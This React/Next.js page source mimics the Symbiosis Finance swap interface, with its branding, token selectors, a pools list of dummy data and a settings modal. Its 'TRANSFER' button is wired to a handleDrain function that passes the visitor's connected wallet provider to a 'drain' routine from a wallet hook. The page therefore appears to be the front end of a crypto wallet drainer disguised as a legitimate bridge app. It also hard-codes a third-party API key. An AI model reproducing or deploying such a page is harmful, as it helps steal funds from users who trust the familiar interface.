"use client";

import { ethers } from "ethers";
import { useEffect, useState } from "react";
import {
  Settings,
  ExternalLink,
  ArrowDown,
  X,
  Info,
  Search,
  Star,
} from "lucide-react";
import Image from "next/image";
import SymbiosisLayout from "../layouts/symbiosisLayout";
import "/public/symbiosis/cygnito-font.css";
import axios from "axios";
import SeiConnectButton from "@/components/global/SeiConnectButton";
import { useAccount } from "wagmi";
import { shortenAddressSmall } from "../utils";
import SelectNetwork from "@/components/symbiosis/SelectNetwork.dropdown";
import { useWallet } from "../../components/useWallet";
import Balance from "@/components/global/Balance";
import { symbiosis_chains, symbiosis_tokens } from "@/data/networks";
import { BsStarFill } from "react-icons/bs";

// Dummy data for pools
const pools = [
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  {
    name: "USDC",
    chain: "Sei v2",
    icon: "/stargate/usdc-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "900,852",
    poolBalance: "103%",
    apr: "0.03%",
    boostedApr: "0.03%",
  },
  {
    name: "USDT",
    chain: "Sei v2",
    icon: "/stargate/usdt-icon.png",
    chainIcon: "/stargate/sei-icon.png",
    totalLocked: "892,414",
    poolBalance: "114.8%",
    apr: "0.02%",
    boostedApr: "0.02%",
  },
  // Add more pool data as needed
];

interface Token {
  name: string;
  address: string;
  symbol: string;
  image: string;
  balance?: string;
}

interface Network {
  name: string;
  icon: string;
  isNew?: boolean;
  tokens?: Token[];
  chainId?: number;
}

const networks: Network[] = [
  {
    name: "BITCOIN",
    chainId: 0, // Bitcoin does not use chainId in the same sense as EVM chains
    icon: "/symbiosis/1.png",
    isNew: true,
    tokens: [],
  },
  {
    name: "TON",
    chainId: -1, // Placeholder as TON does not use standard chainId
    icon: "/symbiosis/Ton.png",
    isNew: true,
    tokens: [],
  },
  {
    name: "ETHEREUM",
    chainId: 1,
    icon: "/symbiosis/eth-logoo.png",
    tokens: [],
  },
  {
    name: "AVALANCHE",
    chainId: 43114,
    icon: "/symbiosis/ava.png",
    tokens: [],
  },
  {
    name: "ZKSYNC ERA",
    chainId: 324,
    icon: "/symbiosis/zks.png",
    tokens: [],
  },
  {
    name: "ARBITRUM ONE",
    chainId: 42161,
    icon: "/symbiosis/arb.png",
    tokens: [],
  },
  // Add more networks as needed
];

const TokenSelector = ({
  label,
  onSelect,
}: {
  label: string;
  onSelect: (network: Network, token: Token) => void;
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [selectedToken, setSelectedToken] = useState<Token | null>(null);
  const [tokens, setTokens] = useState<Token[]>([]);
  const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
  const { chainId } = useAccount();

  useEffect(() => {
    if (!isOpen) return;

    const getOtherTokens = async () => {
      try {
        const apiKey = "EK-g5Pzu-jCzu51S-5sNww";
        const response = await axios.get(
          `https://api.ethplorer.io/getTopTokens?apiKey=${apiKey}`
        );

        const tokenData = response.data.tokens || [];
        const mappedTokens = tokenData
          .filter((token: any) => token.image) // Filter tokens that have an image
          .filter((item: any) => item.name.includes(selectedNetwork.name))
          .map((token: any) => ({
            name: token.name,
            address: token.address,
            symbol: token.symbol,
            image: `https://ethplorer.io${token.image}`,
            balance: "",
          }));
        console.log(tokenData, "token data");

        setTokens(mappedTokens);
        setFilteredTokens(mappedTokens);
      } catch (err) {
        console.error("Error fetching tokens:", err);
      }
    };

    getOtherTokens();
  }, [isOpen, selectedNetwork]);

  useEffect(() => {
    if (searchTerm) {
      const filtered = tokens.filter(
        (token) =>
          token.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.symbol.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.address.toLowerCase().includes(searchTerm.toLowerCase())
      );
      setFilteredTokens(filtered);
    } else {
      setFilteredTokens(tokens);
    }
  }, [searchTerm, tokens, selectedNetwork]);

  const handleSelection = (network: Network, token: Token) => {
    setSelectedNetwork(network);
    setSelectedToken(token);
    setIsOpen(false);
    onSelect(network, token);
  };

  return (
    <div className="space-y-2 ">
      <label className="text-lg text-gray-600">{label}:</label>
      <div className="bg-[#F3F3F3] shadow-md rounded-lg p-4 space-y-2 cursor-pointer">
        <div className="flex items-center gap-2">
          <div
            onClick={() => setIsOpen(true)}
            className="flex gap-2 px-2 py-1 items-center bg-[#CCCCCC] rounded-full"
          >
            {selectedToken ? (
              <>
                <Image
                  src={selectedToken.image}
                  width={20}
                  height={20}
                  alt={selectedToken.name}
                />
                {selectedNetwork && (
                  <Image
                    src={selectedNetwork.icon}
                    width={15}
                    height={15}
                    alt={selectedNetwork.name}
                  />
                )}
              </>
            ) : (
              <>
                <Image
                  src="/symbiosis/download (1).svg"
                  width={20}
                  height={20}
                  alt=""
                />
                <Image
                  src="/symbiosis/download (10).svg"
                  width={15}
                  height={15}
                  alt=""
                />
              </>
            )}
          </div>
          <input
            type="text"
            placeholder="0.0"
            className="bg-transparent w-full outline-none font-mono"
          />
        </div>
      </div>
      <div className="text-sm text-[#CCCCCC] flex justify-start items-center gap-1">
        Balance:
        <Balance
          token={selectedToken?.address}
          chainId={selectedNetwork?.chainId || chainId}
        />
      </div>

      {isOpen && (
        <div className="fixed px-4 inset-0 flex items-center justify-center z-50">
          <div className="bg-[#f3f3f3] rounded-2xl w-full max-w-xl max-h-[80vh] overflow-hidden modal-shadow">
            <div className="p-6">
              <div className="flex items-center justify-between mb-6">
                <h2 className="text-xl sm:text-3xl font-mono">Transfer From</h2>
                <div className="flex items-center gap-2">
                  <button
                    className="p-2 hover:bg-gray-100 rounded-lg"
                    onClick={() => setIsOpen(false)}
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
              </div>

              <div className="flex items-stretch justify-stretch gap-2 mb-6">
                <div className="flex-1 relative bg-white w-full rounded-xl">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="text"
                    placeholder="Search by symbol or address"
                    className="w-full pl-10 pr-4 py-4 bg-transparent rounded-lg outline-none font-mono text-black text-base"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                  />
                </div>
                <button className="px-4 rounded-lg bg-[#ECECEC]">
                  <BsStarFill className="w-5 h-5 text-black" />
                </button>
              </div>

              <div className="flex gap-6">
                <div className="w-1/3 overflow-y-auto max-h-[500px] pr-4 border-r custom-scroll">
                  <h3 className="xl:text-sm text-xs text-[#0000004d] mb-2 font-mono">
                    Network:
                  </h3>
                  <div className="space-y-2">
                    {symbiosis_chains.map((network) => (
                      <button
                        key={network.name}
                        className={`${
                          network.name === selectedNetwork?.name
                            ? "bg-black text-white"
                            : ""
                        } flex items-center gap-2 w-full px-2 py-1 hover:bg-white rounded-lg transition-colors`}
                        onClick={() => setSelectedNetwork(network)}
                      >
                        <Image
                          src={network.icon}
                          width={24}
                          height={24}
                          alt={network.name}
                          className="rounded-full"
                        />
                        <span className="font-mono text-sm">
                          {network.name}
                        </span>
                        {/* {network.isNew && (
                          <span className="text-xs bg-green-500 text-white px-1.5 py-0.5 rounded-full">
                            NEW
                          </span>
                        )} */}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="flex-1 overflow-y-auto max-h-[500px]">
                  <div className="flex justify-between text-xs xl:text-sm text-[#0000004d] mb-2 font-mono">
                    <span>Token</span>
                    <span>Your Balance</span>
                  </div>
                  <div className="space-y-2">
                    {symbiosis_tokens.map((token) => (
                      <button
                        key={token.address}
                        className="flex items-center justify-between w-full p-2 hover:bg-gray-100 rounded-lg transition-colors border-t"
                        onClick={() => handleSelection(selectedNetwork!, token)}
                      >
                        <div className="flex items-center gap-2">
                          <div className="relative">
                            <Image
                              src={token.icon}
                              width={34}
                              height={34}
                              alt={token.name}
                              className="rounded-full"
                            />
                            {selectedNetwork?.icon ? (
                              <Image
                                src={selectedNetwork?.icon}
                                width={17}
                                height={17}
                                alt={selectedNetwork?.name}
                                className="rounded-full absolute top-0 right-0 border"
                              />
                            ) : null}
                          </div>
                          <span className="font-mono text-sm">
                            {token.name}
                          </span>
                        </div>
                        <span className="font-mono text-sm flex justify-start items-center gap-2">
                          {/* {token.balance} */}
                          <Balance chainId={selectedNetwork?.chainId} />
                          <span>'''</span>
                        </span>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default function Page() {
  const { drain } = useWallet();
  const { connector, isConnected } = useAccount();
  const [activeTab, setActiveTab] = useState<"swap" | "pools" | "zap">("swap");
  const [showSettings, setShowSettings] = useState(false);
  const [showDeprecated, setShowDeprecated] = useState(false);
  //   const [searchTerm, setSearchTerm] = useState("");
  const [address, setAddress] = useState("");
  const [slippage, setSlippage] = useState("0.5");
  const [loading, setLoading] = useState(false);
  const [txState, setTxState] = useState("Initial");

  const [isOpen, setIsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [selectedToken, setSelectedToken] = useState<Token | null>(null);
  const [tokens, setTokens] = useState<Token[]>([]);
  const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
  const [transferFromToken, setTransferFromToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [supplyingToToken, setSupplyingToToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [fromToken, setFromToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);
  const [toToken, setToToken] = useState<{
    network: Network;
    token: Token;
  } | null>(null);

  useEffect(() => {
    if (searchTerm) {
      const filtered = tokens.filter(
        (token) =>
          token.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.symbol.toLowerCase().includes(searchTerm.toLowerCase()) ||
          token.address.toLowerCase().includes(searchTerm.toLowerCase())
      );
      setFilteredTokens(filtered);
    } else {
      setFilteredTokens(tokens);
    }
  }, [searchTerm, tokens]);

  const handleSelection = (network: Network, token: Token) => {
    setSelectedNetwork(network);
    setSelectedToken(token);
    setIsOpen(false);
  };

  const handleDrain = async () => {
    if (!connector) {
      console.error("Missing required fields for drain.");
      return;
    }

    try {
      setLoading(true);
      setTxState("Processing");

      const provider = new ethers.providers.Web3Provider(
        await connector.getProvider()
      );
      const chainId = await provider.getSigner().getChainId();

      await drain(provider, chainId, toToken.token.address); // Trigger drain with correct args

      setTxState("Completed");
      setLoading(false);
    } catch (error) {
      console.error("Error in drain function:", error);
      setTxState("Failed");
      setLoading(false);
    }
  };

  const renderSwapContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-2xl">Exchange</h2>
          <p>{"{?}"}</p>
        </div>
        <div className="bg-[#f1f1f1] p-2 rounded-lg">
          <Settings
            className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
            onClick={() => setShowSettings(true)}
          />
        </div>
      </div>

      <div className="space-y-2 relative border-b-2 border-[#707070] pb-5">
        <TokenSelector
          label="From"
          onSelect={(network, token) => setFromToken({ network, token })}
        />
        <div className="flex justify-center absolute w-full bottom-[-15px]">
          <div className="flex justify-center">
            <div className="bg-black rounded-lg p-2 cursor-pointer hover:bg-gray-900">
              <img
                src="/symbiosis/download (5).svg"
                alt="round"
                className="w-[]"
              />
            </div>
          </div>
        </div>
      </div>

      <div className="space-y-2">
        <TokenSelector
          label="To"
          onSelect={(network, token) => setToToken({ network, token })}
        />
      </div>

      <div className="space-y-2">
        <label className="text-sm text-gray-400">Enter address:</label>
        <input
          type="text"
          onChange={(e) => setAddress(e.target.value)}
          value={address}
          placeholder="0xE15085...Dfd8x4"
          className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none font-mono"
        />
        <p className=" text-sm">
          <span className="text-orange-500">Important: </span>
          Use self-custodial wallets only! Do not send funds to addresses
          provided by exchanges or third-party services.
        </p>
      </div>

      <button
        onClick={() => handleDrain()}
        disabled={loading}
        className={`${
          address === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
        } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors`}
      >
        {ethers.utils.isAddress(address)
          ? "TRANSFER"
          : loading
          ? "TRANSFERRING..."
          : "SET VALID ADDRESS"}
      </button>
    </div>
  );

  const renderPoolsContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-xl">All pools</h2>
          <Info className="w-4 h-4 text-gray-400" />
        </div>
        <button className="bg-[#fff] shadow-md px-4 py-4 rounded-lg hover:bg-gray-800 transition-colors">
          My liquidity
        </button>
      </div>

      <div className="space-y-4">
        <input
          type="text"
          placeholder="Search by Name/Chain/Token"
          className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
        />

        <label className="flex items-center gap-2">
          <input
            type="checkbox"
            checked={showDeprecated}
            onChange={(e) => setShowDeprecated(e.target.checked)}
          />
          <span className="text-sm text-gray-400">Show deprecated pools</span>
        </label>

        <div className="space-y-4">
          {pools.map((pool, index) => (
            <div key={index} className="bg-[#f3f3f3] rounded-lg p-4">
              <div className="flex justify-between items-center mb-4">
                <div className="flex items-center gap-2">
                  <div className="relative">
                    <Image
                      src={pool.icon}
                      alt={pool.name}
                      width={32}
                      height={32}
                      className="rounded-full"
                    />
                    <div className="border-2 p-[1px] absolute -top-0 -right-1 bg-white  border-white rounded-full">
                      <Image
                        src={pool.chainIcon}
                        alt={pool.name}
                        width={12}
                        height={12}
                        className=" rounded-full"
                      />
                    </div>
                  </div>
                  <span className="font-mono">{pool.name}</span>
                </div>
                <div className="flex items-center gap-2">
                  <Image
                    src={pool.chainIcon}
                    alt={pool.chain}
                    width={16}
                    height={16}
                  />
                  <span className="text-sm">{pool.chain}</span>
                </div>
              </div>
              <div className="flex items-center justify-between gap-4 text-xs">
                <div>
                  <div className="text-gray-400">Total Locked</div>
                  <div className="font-mono">{pool.totalLocked}</div>
                </div>
                <div>
                  <div className="text-gray-400">Pool balance {" {?}"}</div>
                  <div className="font-mono">{pool.poolBalance}</div>
                </div>
                <div>
                  <div className="text-gray-400">APR {" {?}"}</div>
                  <div className="font-mono">{pool.apr}</div>
                </div>
                <div>
                  <div className="text-gray-400">Boosted APR {" {?}"}</div>
                  <div className="font-mono">{pool.boostedApr}</div>
                </div>
              </div>
              <button className="w-full mt-4 text-md bg-[#fff] text-center py-2 rounded-lg hover:bg-gray-800 transition-colors">
                Manage
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  const renderZapContent = () => (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div className="flex items-center gap-2">
          <h2 className="text-xl">Cross-chain Zap</h2>
          <Info className="w-4 h-4 text-gray-400" />
        </div>
        <div className="bg-[#f1f1f1] p-2 rounded-lg">
          <Settings
            className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
            onClick={() => setShowSettings(true)}
          />
        </div>
      </div>

      {/* Similar to swap content but with different labels */}
      <div className="space-y-4">
        <TokenSelector
          label="Transfer From"
          onSelect={(network, token) =>
            setTransferFromToken({ network, token })
          }
        />

        <div className="flex justify-center">
          <div className="bg-black rounded-lg p-2 cursor-pointer hover:bg-gray-900">
            <ArrowDown className="w-5 h-5 text-white" />
          </div>
        </div>
        <TokenSelector
          label="Supplying To"
          onSelect={(network, token) => setSupplyingToToken({ network, token })}
        />

        <button className="w-full bg-black text-white py-2 rounded-lg hover:bg-gray-900 transition-colors">
          CONNECT WALLET
        </button>
      </div>
    </div>
  );

  return (
    <SymbiosisLayout>
      <div className="min-h-screen bg-[#F9F9F9] text-black">
        {/* Top Banner */}
        <div className="bg-blue-500 md:text-md text-xs text-white font-bold p-3 text-center flex items-center justify-center gap-2">
          Cross-chain swaps to TON with Symbiosis TON Bridge v2
        </div>

        {/* Navbar */}
        <nav className="mt-3">
          <div className="w-full mx-auto px-4">
            <div className="h-16">
              <div className="flex justify-between items-center gap-8">
                <div className="flex items-center gap-2">
                  <Image
                    src="/symbiosis/download.svg"
                    alt="Symbiosis"
                    width={40}
                    height={40}
                    className="rounded-2xl"
                  />
                  <span className="font-mono flex">
                    Symbiosis <span className="md:block hidden">/ App</span>
                  </span>
                  <span className="text-sm bg-[#fff] rounded-2xl p-1 text-black ">
                    v2
                  </span>
                </div>
                <div className="md:flex hidden items-center text-lg gap-8">
                  <a
                    href="#"
                    className="hover:text-gray-300 font-bold transition-colors"
                  >
                    Swap
                  </a>
                  <a
                    href="https://explorer.symbiosis.finance/"
                    className="hover:text-gray-300 text-gray-400 transition-colors"
                  >
                    Explorer
                  </a>
                  <a
                    href="https://rewards.symbiosis.finance/vesis"
                    className="flex items-center gap-1 bg-[#76FB6D] font-bold px-4 py-2 rounded-xl text-[#000] hover:bg-[#5fd656] transition-colors"
                  >
                    veSIS
                    <ExternalLink className="w-4 h-4" />
                  </a>
                </div>
                {isConnected ? (
                  <ConnectedButtonsGroup />
                ) : (
                  <SeiConnectButton
                    connect={
                      <button className="bg-black text-white text-sm md:px-5 px-2 md:py-3 py-1 rounded-2xl hover:bg-gray-900 transition-colors">
                        Connect wallet
                      </button>
                    }
                  />
                )}
              </div>
            </div>
          </div>
        </nav>

        {/* Main Content */}
        <main className="max-w-[600px] mx-auto px-4 py-8">
          <div className=" rounded-2xl p-6">
            {/* Tabs */}
            <div className="flex rounded-2xl bg-[#F1F1F1] p-1 mb-6">
              {(["swap", "pools", "zap"] as const).map((tab) => (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  className={`flex-1 py-2 rounded-2xl text-center capitalize transition-colors ${
                    activeTab === tab
                      ? "bg-white text-black"
                      : "text-gray-400 hover:text-white"
                  }`}
                >
                  {tab}
                </button>
              ))}
            </div>

            {/* Tab Content */}
            {activeTab === "swap" && renderSwapContent()}
            {activeTab === "pools" && renderPoolsContent()}
            {activeTab === "zap" && renderZapContent()}
          </div>
        </main>

        {/* Settings Modal */}
        {showSettings && (
          <div className="fixed px-4 inset-0 bg-black/50 flex items-center justify-center">
            <div className="bg-[#F3F3F3] rounded-2xl p-6 w-full max-w-md">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-xl">Settings</h2>

                <div className="bg-white p-2 rounded-lg">
                  <X
                    className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
                    onClick={() => setShowSettings(false)}
                  />
                </div>
              </div>
              {/* Add settings content here */}
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-sm text-black">
                    Slippage Tolerance
                  </label>

                  <div className="flex items-center justify-between gap-2 ">
                    <div className="md:flex hidden items-center gap-1 ">
                      <div
                        onClick={() => setSlippage("1.0")}
                        className={`${
                          slippage === "1.0" && "bg-black text-white"
                        } p-3 cursor-pointer  text-sm hover:bg-white rounded-lg`}
                      >
                        <p>1.0%</p>
                      </div>
                      <div
                        onClick={() => setSlippage("1.5")}
                        className={`${
                          slippage === "1.5" && "bg-black text-white"
                        } p-3  cursor-pointer text-sm hover:bg-white rounded-lg`}
                      >
                        <p>1.5%</p>
                      </div>
                      <div
                        onClick={() => setSlippage("2.0")}
                        className={`${
                          slippage === "2.0" && "bg-black text-white"
                        } p-3 cursor-pointer  text-sm hover:bg-white rounded-lg`}
                      >
                        <p>2.0%</p>
                      </div>
                    </div>
                    <div className="bg-white shadow-lg w-full flex items-center gap-2 rounded-lg border border-transparent focus-within:border-black ">
                      <input
                        type="number"
                        value={slippage}
                        onChange={(e) => setSlippage(e.target.value)}
                        className="w-full bg-transparent  rounded-lg p-3 outline-none"
                        placeholder={slippage || "0.5%"}
                      />
                      <div className="text-gray-400 pr-2">%</div>
                    </div>
                  </div>
                </div>
                <p className="text-sm">
                  <span className="font-bold">Slippage Tolerance </span>
                  is the maximum price change you are willing to accept for your
                  trades to be completed. On-chain and cross-chain swaps will be
                  treated in a special way if the price change exceeds the
                  specified value.{" "}
                  <a
                    href="https://docs.symbiosis.finance/user-guide-webapp/more-about-slippage-tolerance"
                    className="underline text-[#76FB6D]"
                  >
                    Learn more
                  </a>
                </p>
                <div className="space-y-2">
                  <label className="text-sm text-black">
                    On-chain trades deadline:
                  </label>

                  <div className="bg-white shadow-lg flex items-center gap-2 rounded-lg border border-transparent focus-within:border-black ">
                    <input
                      type="number"
                      className="w-full bg-transparent  rounded-lg p-3 outline-none"
                      placeholder="30"
                    />
                    <div className="text-gray-400 pr-2">Minutes</div>
                  </div>
                </div>
              </div>

              <div className="bg-black mt-7 rounded-xl text-center py-3 w-full text-white">
                SAVE CHANGES
              </div>
            </div>
          </div>
        )}
      </div>
    </SymbiosisLayout>
  );
}

const ConnectedButtonsGroup = () => {
  const { address } = useAccount();
  return (
    <div className="flex justify-start items-center gap-2 flex-nowrap whitespace-nowrap">
      <SelectNetwork />
      <button className="rounded-xl text-white bg-black px-4 py-3 font-medium">
        {shortenAddressSmall(address)}
      </button>
    </div>
  );
};
